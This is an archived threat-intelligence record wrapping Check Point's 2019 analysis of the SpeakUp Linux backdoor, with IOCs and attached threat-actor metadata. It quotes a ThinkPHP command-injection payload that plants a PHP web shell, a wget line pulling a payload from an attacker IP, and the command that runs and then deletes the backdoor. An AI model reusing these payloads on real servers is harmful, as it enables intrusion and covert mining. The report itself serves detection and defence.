{
    "id": "6fa929c2-2ade-418a-8a98-d32c68873283",
    "created_at": "2023-01-12T15:03:41.688261Z",
    "updated_at": "2025-03-27T02:09:07.82885Z",
    "deleted_at": null,
    "sha1_hash": "2d0f47c4f874e65006dddfac074d7c8732b12ca9",
    "title": "2019-02-04 - SpeakUp- A New Undetected Backdoor Linux Trojan",
    "authors": "",
    "file_creation_date": "2022-05-27T22:33:42Z",
    "file_modification_date": "2022-05-27T22:33:42Z",
    "file_size": 1191560,
    "plain_text": "# SpeakUp: A New Undetected Backdoor Linux Trojan\n\n**research.checkpoint.com/speakup-a-new-undetected-backdoor-linux-trojan/**\n\nFebruary 4, 2019\n\n\nFebruary 4, 2019\n\n\nCheck Point Research has discovered a new campaign exploiting Linux servers to implant a new Backdoor Trojan.\nDubbed ‘SpeakUp’, the new Trojan exploits known vulnerabilities in six different Linux distributions.\nThe attack targets worldwide servers including AWS hosted machines.\n\nCheck Point researchers have spotted a new campaign exploiting Linux servers to implant a new Backdoor which evades all\nsecurity vendors. The new Trojan, named “SpeakUp” after one of its command and control names, exploits known\nvulnerabilities in six different Linux distributions. The attack is gaining momentum and targeting servers in East Asia and Latin\nAmerica, including AWS hosted machines.\n\nSpeakUp acts to propagate internally within the infected subnet, and beyond to new IP ranges, exploiting remote code\nexecution vulnerabilities. In addition, SpeakUp presented ability to infect Mac devices with the undetected backdoor.\n\nWhile the exact identity of the threat actor behind this new attack is still unconfirmed, Check Point Researchers were able to\ncorrelate SpeakUp’s author with malware developer under the name of Zettabit. Although SpeakUp is implemented differently,\nit has a lot in common with Zettabit’s craftmanship.\n\n\n-----\n\n**Figure 1: SpeakUp’s Victim Distribution**\n\n**Figure 2: SpeakUp’s propagation rate per day**\n\n**Infection Vector**\n\nThe initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques\nfor uploading a PHP shell that serves and executes a Perl backdoor.\n\nThe exploitation is issued in three steps:\n\n1. Exploiting CVE-2018-20062 for uploading a PHP shell\n\nUsing a GET request, a remote command execution vulnerability in ThinkPHP (CVE-2018-20062) is sent to the targeted server,\nas shown below:\n\ns=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<? php $action =\n_$_GET[‘module’];system($action);? ^>>index.php_\n\nThis shell executes commands sent via the “module” parameter in a query.\n\n1. Serving the backdoor\n\nAnother HTTP request is sent to the targeted server, with the following resource:\n\n\n-----\n\n/?module wget hxxp://67[.]209.177.163/ibus O /tmp/e3ac24a0bcddfacd010a6c10f4a814bc\n\nThe above standard injection pulls the ibus payload and stores it on /tmp/e3ac24a0bcddfacd010a6c10f4a814bc\n\n1. Launching the backdoor\n\nThe execution is issued using an additional HTTP request:\n\n/?module=perl /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc;sleep 2;rm -rf /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc\n\nThat executes the perl script, puts it to sleep for two seconds and deletes the file to remove any evidence.\n\n**Backdoor**\n\nThe sample we analyzed was observed targeting a machine in China on January 14, 2019 and was first submitted to VirusTotal\non January 9 2019. At the time of writing this article, it has no detections in VT.\n\n**Figure 3: no detections for SpeakUp in Virus Total**\n\nIn an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted\nbase64. To our dismay, the C&C communication was also encoded with the same combination.\n\nThe revealed data contains multiple C&C domains, IP addresses and other unique parameters, along with second-stage\npayloads and additional modules.\n\nIn the below analysis we will go through the malicious code, reveal the different functions and modules the Trojan runs on the\nvictim’s machine.\n\n**Victim Registration**\n\n\n-----\n\nSpeakUp uses POST and GET requests over HTTP to communicate with its main C&C which is the compromised website of\nspeakupomaha[.]com.\nThe first POST packet sends a victim ID and more introductory information such as the current version of the installed script.\n(Currently 1.0.4)\nThe immediate first C&C response is “needrgr” which means the infected victim is new to the server and needs a registration.\nAfterwards, the Trojan posts “full information” about the machine by executing the following LINUX commands:\n\n_Uname (-r, -v, -m, -n,-a, -s)_\n_Whoami_\n_Ifconfig –a_\n_Arp –a_\n_cat /proc/cpuinfo | grep -c “cpu family” 2>&1_\n_who –b_\n\n**Figure 4: The registration process and introductory commands**\n\n**SpeakUp’s Main Functions**\n\nAfter the registration process is completed, SpeakUp continuously communicates with its C&C for new tasks on a fixed “knock”\ninterval.\n\nThe following command types are available by the C&C:\n\n“newtask”- Execute arbitrary code on the local machine, download and execute a file from any remote server, kill or uninstall\nthe program and sends updated fingerprint data.\n\n“notask”- Sleep for 3 seconds and ask for additional command.\n\nnewerconfig”- Update the downloaded miner configuration file.\n\nSpeakUp’s persistence is ensured by using cron and an internal mutex to ensure only one instance remains alive at all times.\n\n**Post-Infection Traffic**\n\nOnce the victim is registered successfully, the C&C begins sending new tasks. Most of them manipulate the machine to\ndownload and execute different files.\n\nAn interesting point to mention is the User-Agents in use. SpeakUp defines three User-Agents that the infected machine must\nuse in every communication with its C&C. Two of them are MacOS X User-Agents and the third is a hashed string:\n\n_Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko)_\n_Mobile/BADDAD_\n_Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405_\n\n\n-----\n\n_E9BC3BD76216AFA560BFB5ACAF5731A3_\n\n**Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent**\n\n[At the moment SpeakUp serves XMRig miners to its listening infected servers. According to XMRHunter the wallets hold a](https://www.xmrhunter.com/)\ntotal of ~107 Monero coins.\n\n**Figure 6: SpeakUp receives additional commands to execute, this time in plain text.**\n\n**Propagation**\n\nSpeakUp also equips its backdoors with i (sic), a python script which allows the backdoor to scan and infect more Linux servers\nwithin its internal and external subnets. Its main functions are:\n\n1. Brute-force using a pre-defined list of usernames and passwords in an attempt to login to Admin panels.\n2. Scan the network environment of the infected machine; checks for availability of specific ports on servers that share the\n\nsame internal and external subnet mask (i.e 255.255.0.0\\16).\n3. Try to exploit the following Remote Code Execution vulnerabilities in the targeted servers:\n\na) CVE-2012-0874: JBoss Enterprise Application Platform Multiple Security Bypass Vulnerabilities\nb) CVE-2010-1871: JBoss Seam Framework remote code execution\n[c) JBoss AS 3/4/5/6: Remote Command Execution (exploit)](https://www.exploit-db.com/exploits/36575)\nd) CVE-2017-10271: Oracle WebLogic wls-wsat Component Deserialization RCE\n\n\n-----\n\ne) CVE 2018 2894: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware.\n[f) Hadoop YARN ResourceManager – Command Execution (exploit)](https://www.exploit-db.com/exploits/45025)\ng) CVE-2016-3088: Apache ActiveMQ Fileserver File Upload Remote Code Execution Vulnerability.\n\nA successful exploitation of one of the vulnerabilities will result in deploying the original ibus script on the exploited server.\n\n**Attacker Identity and Leads**\n\nIbus client for Unix OS\n\n[Inside the ibus script, we can see a short description about an IBus client for GNU Emacs. The IBus client is an open-source](https://github.com/ibus/ibus)\nmultilingual input framework for Linux and Unix OS. While it supports all languages that do not use Latin letters, it seems that\nthe main audience is Asian users. The description and the file name are the only elements that link SpeakUp to the Ibus\nframework; the content has no similarities whatsoever.\n\nThis may imply a connection between SpeakUp to East Asia.\n\n**Unique User-Agents**\n\nThe unique User-Agents used in the HTTP communication between SpeakUp to the C&C are a possible path to the identity of\nthe threat actor behind this campaign.\nThe unique strings mainly consist of “Mobile/BADDAD“, “Mobile/7B405” and “E9BC3BD76216AFA560BFB5ACAF5731A3”.\n\nInterestingly enough, the string turned out to be the md5 hash of the word liteHTTP.\n\n[Googling liteHTTP leads to the liteHTTP github project.](https://github.com/zettabithf/LiteHTTP)\n\nWhile liteHTTP is a C# based bot which targets Windows clients, its modules are somewhat similar to our SpeakUp Trojan.\n\nDownload & execute\nStartup (with persistence)\nCollection of system information (OS, version, installed location, etc.)\nSelf-update\nUninstall\n\n[This project was created by a user called zettabithf which is linked to a user with the same name in Hack Forums.](https://www.hackforums.net/member.php?action=profile&uid=1972967)\n\n\n-----\n\n**Figure 7: Zettabit s user description on Hack Forums**\n\nThe Hack Forums profile may imply the author of SpeakUp backdoor is Russian speaking, as many of the comments are\nwritten in this language. He also seems to be a botnet developer, providing recommendations and publishing his LiteHTTP bot,\nwhich seems to have a well-designed GUI interface.\n\nAnother interesting thing to note is the use of the acronym “Knock” on several occasions in his posts. “Knock” also appears in\nseveral strings inside the code of SpeakUp.\n\n**Figures 8 and 9: LiteHTTP screenshots taken from the user`s profile in which the acronym “Knock” appears**\n\n**Conclusion**\n\nSpeakUp`s obfuscated payloads and propagation technique is beyond any doubt the work of a bigger threat in the making. It is\nhard to imagine anyone would build such a compound array of payloads just to deploy few miners. The threat actor behind this\ncampaign can at any given time deploy additional payloads, potentially more intrusive and offensive. It has the ability to scan\n\n\n-----\n\nthe surrounding network of an infected server and distribute the malware. This campaign, while still relatively new, can evolve\ninto something bigger and potentially more harmful.\n\nIndeed, the threat actor behind this campaign, ‘Zettabithf’ himself, provides some ‘words of wisdom’ in this respect:\n\n[CloudGuard IaaS is an advanced threat prevention technology that protects against on your cloud infrastructure, including new](https://www.checkpoint.com/solutions/cloud-security/)\nTrojans like ‘SpeakUp’.\n\nThe Check Point IPS blade provides protections against these threats:\n\nCommand Injection Over HTTP\nNoneCMS ThinkPHP Remote Code Execution (CVE-2018-20062)\nOracle WebLogic WLS Security Component Remote Code Execution (CVE-2017-10271)\nOracle WebLogic WLS Server Component Arbitrary File Upload(CVE-2018-2894)\nHadoop YARN ResourceManager Remote Command Execution\nApache ActiveMQ Fileserver Multi Methods Directory Traversal(CVE-2016-3088)\nJBoss Seam 2 Framework Remote Code Execution (CVE-2010-1871)\nJBoss Enterprise Application Platform Invoker Servlets Remote Code Execution (CVE-2012-0874)\nRed Hat JBoss AS Remote Code Execution\nSuspicious Linux Shell Downloader\n\nThe Check Point Anti-Bot blade provides protections against this threat:\n\nLinux.SpeakUp\n\n**IOCs**\n\n**Md5:**\n\n_SpeakUp Scripts:_\n\n0a4e5831a2d3115acb3e989f0f660a6f\n\n0b5e1eb67be7c3020610b321f68375c1\n\n968d1906be7eb8321a3afac5fde77467\n\n074d7a4417d55334952d264c0345d885\n\nf357f32d7c2ddfef4b5850e7506c532b\n\nb6311bffcea117dceac5ccac0a243ae5\n\n2adf4e4512aaafab75e8411aa7121ffa\n\na73c7b777d31b0a8ef270809e2ed6510\n\n114cda60d215e44baeef22b7db0c64d5\n\n8f725fc5406ebf679c5c7ade3e8d5f70\n\n4a80a075c7c6b5e738a7f4b60b7b101f\n\ne18749e404baec2aa29f4af001164d1b\n\n1a377b5d5d2162327f0706cc84427780\n\n1da94e156609d7e880c413a124bad004\n\n713260a53eff05ad44aad8d6899f1c6e\n\n36cda3c77ba380d6388a01aafcbaa6c7\n\n\n-----\n\n0f83482368343f5c811bac84a395d2c0\n\n8dd6cb5f33d25512805c70bd3db5f433\n\ne4ca1e857034cbe0428d431c15ec8608\n\n36502273cee61825dc97d62a3dffe729\n\nf16c5a6342ccc253b1de177d3fa310b1\n\n08d7674532cc226931570e6a99d5ba30\n\n279c4aa955085480f3ad0c19aa36a93b\n\n**_XMRig Miners:_**\n\nf79be3df4cbfe81028040796733ab07f\na21a3d782d30b51515834a7bf68adc8e\nc572a10ca12f3bd9783c6d576aa080fb\nb60ec230644b740ca4dd6fd45059a4be\n5e6b6fcd7913ae4917b0cdb0f09bf539\nae875c496535be196449547a15205883\n068d424a1db93ec0c1f90f5e501449a3\n996e0c8190880c8bf1b8ffb0826cf30f\n\n**C&Cs:**\n\n67[.]209.177.163\n\n173[.]82.104.196\n\n5[.]196.70.86\n\n120[.]79.247.183\n\n5[.]2.73.127/lnsqqFE2jK/pprtnp153WWW.php\n\nSpeakupomaha[.]com/misc/ui/images/Indxe.php\n\nLinuxservers[.]000webhostapp[.]com/hp.html\n\nlinuxsrv134[.]xp3[.]biz\n\n**Monero Wallets:**\n\n47UW2Qv7AB4CsD8L5WWSvx58ztrzHhcMeYN7AJry9aMZhGDLXGwBHLv8LpaDUxpmdWfqbbfrqpdieQAeVSMCU1qY4BFABPY\n4Aa3TcU7ixMVcYwbsw8ENVbFwt4ZuqrNBVij5TRvPCTpGRK5BKBHQPu7ahT7z2A6547a5Lcn7yPZV1xU22ZbviqxUX7JVuP\n4An3Radh69LgcTHJf1U3awa9ffej4b6DcUmEv8wirsDm8zRMSjifrwybH2AzHdEsW8eew3rFtk4QbGJMxqitfxmZJhABxpT\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-02-04 - SpeakUp- A New Undetected Backdoor Linux Trojan.pdf"
    ],
    "report_names": [
        "2019-02-04 - SpeakUp- A New Undetected Backdoor Linux Trojan.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1162e0d4-b69c-423d-a4da-f3080d1d2b0c",
            "created_at": "2023-01-06T13:46:38.508262Z",
            "updated_at": "2025-03-27T02:00:02.851407Z",
            "deleted_at": null,
            "main_name": "Molerats",
            "aliases": [
                "Gaza Hackers Team",
                "Gaza cybergang",
                "Gaza Cybergang",
                "Operation Molerats",
                "Extreme Jackal",
                "ALUMINUM SARATOGA",
                "G0021",
                "BLACKSTEM"
            ],
            "source_name": "MISPGALAXY:Molerats",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0c502f6d-640d-4e69-bfb8-328ba6540d4f",
            "created_at": "2022-10-25T15:50:23.756782Z",
            "updated_at": "2025-03-27T02:00:55.539397Z",
            "deleted_at": null,
            "main_name": "Molerats",
            "aliases": [
                "Molerats",
                "Operation Molerats",
                "Gaza Cybergang"
            ],
            "source_name": "MITRE:Molerats",
            "tools": [
                "MoleNet",
                "DustySky",
                "DropBook",
                "SharpStage",
                "PoisonIvy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "847f600c-cf90-44c0-8b39-fb0d5adfcef4",
            "created_at": "2022-10-25T16:07:23.875541Z",
            "updated_at": "2025-03-27T02:02:10.005591Z",
            "deleted_at": null,
            "main_name": "Molerats",
            "aliases": [
                "ATK 89",
                "Aluminum Saratoga",
                "Extreme Jackal",
                "Gaza Cybergang",
                "Gaza Hackers Team",
                "Molerats",
                "Operation DustySky",
                "Operation DustySky Part 2",
                "Operation Molerats",
                "Operation Moonlight",
                "Operation SneakyPastes",
                "Operation TopHat",
                "TA402",
                "TAG-CT5"
            ],
            "source_name": "ETDA:Molerats",
            "tools": [
                "BadPatch",
                "Bladabindi",
                "BrittleBush",
                "Chymine",
                "CinaRAT",
                "Darkmoon",
                "Downeks",
                "DropBook",
                "DustySky",
                "ExtRat",
                "Gen:Trojan.Heur.PT",
                "H-Worm",
                "H-Worm RAT",
                "Houdini",
                "Houdini RAT",
                "Hworm",
                "Iniduoh",
                "IronWind",
                "Jenxcus",
                "JhoneRAT",
                "Jorik",
                "KasperAgent",
                "Kognito",
                "LastConn",
                "Micropsia",
                "MoleNet",
                "Molerat Loader",
                "NeD Worm",
                "NimbleMamba",
                "Njw0rm",
                "Pierogi",
                "Poison Ivy",
                "Quasar RAT",
                "QuasarRAT",
                "SPIVY",
                "Scote",
                "SharpSploit",
                "SharpStage",
                "WSHRAT",
                "WelcomeChat",
                "Xtreme RAT",
                "XtremeRAT",
                "Yggdrasil",
                "dinihou",
                "dunihi",
                "njRAT",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535821,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1653690822,
    "ts_modification_date": 1653690822,
    "files": {
        "pdf": "https://archive.orkl.eu/2d0f47c4f874e65006dddfac074d7c8732b12ca9.pdf",
        "text": "https://archive.orkl.eu/2d0f47c4f874e65006dddfac074d7c8732b12ca9.txt",
        "img": "https://archive.orkl.eu/2d0f47c4f874e65006dddfac074d7c8732b12ca9.jpg"
    }
}